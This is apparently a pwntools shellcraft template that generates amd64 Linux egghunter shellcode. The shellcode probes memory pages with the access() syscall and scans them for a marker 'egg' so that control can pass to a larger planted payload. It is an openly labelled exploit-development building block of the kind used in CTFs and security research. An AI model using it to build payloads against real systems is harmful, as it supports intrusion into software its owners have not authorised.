<%
from pwnlib.shellcraft import amd64, pretty, common
from pwnlib.util.packing import pack, unpack
from pwnlib.util.lists import group
from pwnlib import constants, log
%>
<%page args="egg, start_address = 0x7efc00000000, stride = 0x10000"/>
<%docstring>
egghunter(egg, start_address = 0)

Searches memory for the byte sequence 'egg'.

Return value is the address immediately following the match,
stored in RDI.

Arguments:
    egg(str, int): String of bytes, or word-size integer to search for
    start_address(int): Where to start the search
</%docstring>
<%
egghunter_loop = common.label('egghunter_loop')
memcmp         = common.label('egghunter_memcmp')
done           = common.label('egghunter_done')
next_page      = common.label('egghunter_nextpage')

egg_str = egg
if isinstance(egg, int):
    egg_str = pack(egg, bytes=4)

if len(egg_str) % 4:
    log = log.getLogger('pwnlib.shellcraft.templates.amd64.linux.egghunter')
    log.error("Egg size must be a multiple of four bytes")
%>
    cld
    ${amd64.pushstr(egg_str, False)}
% if start_address:
    ${amd64.mov('rbx', start_address)}
% endif

## Search for pages
${egghunter_loop}:
    ${amd64.linux.access('rbx', 0)}

## EFAULT == Bad address
    cmp al, (-${pretty(constants.EFAULT)}) & 0xff
    jz ${next_page}

## We found a page, scan all of the DWORDs
    ${amd64.mov('rdx', 0x1000/4)}
${memcmp}:
    test rdx, rdx
    jz   ${next_page}

## Scan forward by DWORD
    ${amd64.setregs({'rsi':'rsp',
                    'rdi':'rbx',
                    'rcx': len(egg_str)/4})}
## Success?
    repe cmpsd
    jz ${done}

## Increment the starting point, decement the counter, restart
    add rbx, 4
    dec rdx
    jnz ${memcmp}

${next_page}:
## Next page
    or   bx, 0xfff
    inc rbx
    jmp ${egghunter_loop}
${done}:

